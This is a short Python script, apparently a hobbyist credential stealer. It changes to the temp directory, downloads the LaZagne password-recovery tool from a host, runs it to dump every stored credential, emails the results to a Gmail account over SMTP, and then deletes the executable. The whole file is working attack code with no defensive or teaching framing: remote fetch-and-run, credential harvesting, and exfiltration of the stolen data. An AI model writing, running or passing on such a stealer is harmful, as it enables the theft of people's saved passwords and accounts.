import subprocess, smtplib, requests, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)  # from to email
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("http://127.0.0.1/imp/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_email("iformation369@gmail.com", "password", result)  # mail id and password
os.remove("lazagne.exe ")
